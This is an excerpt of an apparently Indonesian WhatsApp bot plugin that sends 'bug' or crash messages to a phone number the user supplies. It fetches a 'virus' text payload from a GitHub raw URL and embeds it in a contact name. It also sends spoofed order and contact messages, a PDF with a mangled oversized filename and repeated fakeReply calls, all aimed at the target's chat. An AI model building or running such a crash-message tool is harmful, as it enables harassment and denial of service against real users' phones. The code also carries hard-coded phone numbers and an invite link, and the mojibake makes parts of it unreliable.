...
let handler = async (
  m,
  { conn, args, text, command, usedPrefix: _p, participants }
) => {
  if (!text)
    return m.reply(
      `Contoh Penggunaan : *${
  ...
  let virus = await (
    await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v30.txt")
  ).text();
  let virus2 = await (
    await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v30.txt")
  ).text();
  ...
  let sections = [
    {
      ...
      rows: [
        ...
        { title: "Bug Bunga", rowId: `${_p + command} bugbunga ${text}` },
        {
          title: "Bug TextCrash",
          rowId: `${_p + command} bugtextcrash ${text}`,
        },
      ],
    },
  ];
  ...
  const trol = {
    ...
    message: {
      orderMessage: {
        ...
        message: "",
        orderTitle: `${packname}`,
        sellerJid: "6289503433262@s.whatsapp.net",
  ...
  //#Troli 2
  const ftrolii = {
    key: { fromMe: false, participant: "0@s.whatsapp.net", remoteJid: "@g.us" },
    message: {
      orderMessage: {
        itemCount: fsizedoc,
        status: 200,
  ...
  const fkontaak = {
    key: {
      fromMe: false,
      participant: `0@s.whatsapp.net`,
      ...(m.chat ? { remoteJid: "@broadcast" } : {}),
    },
    message: {
      contactMessage: {
        displayName: `${packname}${virus}`,
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${packname}\nitem1.TEL;waid=6289503433262:6289503433262\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
      },
    },
  };
  //=================================================//
  ...
  switch (type) {
    case "bugbunga":
      {
        conn.sendMessage(text.replace(/[^0-9]/g, "") + "@s.whatsapp.net", {
          text: "",
          templateButtons: [
            {
              callButton: {
            ...
            },
            {
              callButton: {
                displayText: "OWNER",
                phoneNumber: "6283186308195",
              },
            },
            {
              urlButton: {
                displayText: "GROUP HW MODS WA",
                url: "https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2",
              },
            },
            { quickReplyButton: { displayText: "MY", id: "reply Menger" } },
    ...
    case "vn":
      {
        conn.sendMessage(
          ...
          { audio: thumb, mimetype: "audio/mpeg", ptt: true },
          { quoted: adehvn }
        );
    ...
    case "pdf":
      {
        conn.sendMessage(
          ...
          {
            document: thumb,
            filename: `馃尀饢Ч蜏蛽汀蜏饾懘汀蜏饾懆汀蜏覊饾懘汀蜏饾懆汀蜏覊饾應汀蜏饾懚汀蜏饢Ч蛽蛽鬆嚍馂.pdf`,
    ...
    case "sticker":
      {
        let stiker = await sticker(
          null,
          "https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg",
          global.packname,
          global.author
        );
        conn.sendFile(
    ...
    case "bugcrash":
      {
        conn.fakeReply(
          text.replace(/[^0-9]/g, "") + "@s.whatsapp.net",
          "A",
          "622150996855@s.whatsapp.net",
          "B",
          "0@s.whatsapp.net@broadcast"
        );
        conn.fakeReply(
          text.replace(/[^0-9]/g, "") + "@s.whatsapp.net",
          "A",
